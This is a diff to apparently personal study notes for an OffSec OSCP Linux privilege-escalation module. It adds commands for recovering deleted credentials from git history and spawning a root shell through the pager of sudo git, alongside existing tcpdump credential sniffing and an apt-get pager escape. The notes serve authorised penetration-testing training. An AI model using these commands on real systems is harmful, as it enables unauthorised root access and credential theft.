@@ -2,7 +2,7 @@
 
 - Module: PEN-200 / Module 18 — Linux Privilege Escalation (OSCP)
 - URL: https://portal.offsec.com/courses/pen-200-44065/learning/linux-privilege-escalation-45403
-- Code/command blocks: 30
+- Code/command blocks: 33
 
 > Terminal output is omitted; only commands & scripts are captured. Lab narrative uses the users `joe` (low-priv) and `eve`, host `debian-privesc` / `ubuntu-privesc` — kept literal since the chain refers back to them.
 > Placeholders: `{{TARGET_IP}}` the box (remote SSH/hydra/scp target), `{{LHOST}}`/`{{LPORT}}` your Kali listener for reverse shells, `{{WORDLIST}}` a generated/wordlist file, `{{OUTPUT}}` an output file.
@@ -139,6 +139,24 @@ watch -n 1 "ps -aux | grep pass"        # catch short-lived root processes passi
 sudo tcpdump -i lo -A | grep "pass"     # if granted sudo tcpdump: sniff loopback for clear-text creds
 ```
 
+## 18.2.3 Mining Git repositories (supplement)
+
+> A `.git` directory in a web root or home dir is a credential goldmine — commit history keeps
+> **removed** secrets (config passwords, staging scripts). If the repo is root-owned but you have
+> `sudo git` (or root), read the history: `git show <hash>` prints a commit's diff, exposing deleted
+> lines (e.g. an `sshpass -p "..."` staging script).
+
+```bash
+find / -name .git -type d 2>/dev/null       # locate repos (often /srv/www, /var/www, ~)
+cd /srv/www/wordpress
+sudo git status                             # HEAD / working-tree state
+sudo git log                                # commit history — read the messages ("Removed staging script")
+sudo git show <commit-hash>                 # diff of a commit — recovers deleted creds/files
+```
+
+> Also grep the working tree for cleartext creds (`wp-config.php` → `DB_PASSWORD`) — a common
+> web-app foothold-to-credentials pivot.
+
 ---
 
 # 18.3 — Insecure File Permissions
@@ -236,6 +254,14 @@ apt-get GTFOBins escape (works — spawns a shell from `less`):
 ```bash
 sudo apt-get changelog apt
 !/bin/sh                                # inside the pager -> root shell
+```
+
+git GTFOBins escape (same pager `!`-trick — common when `sudo git` is allowed):
+
+```bash
+sudo git -p help config                 # opens the pager (less) as root
+!/bin/bash                              # inside the pager -> root shell
+# if env vars are permitted instead:  sudo PAGER='sh -c "exec sh 0<&1"' git -p help
 ```
 
 ## 18.4.3 Exploiting kernel vulnerabilities
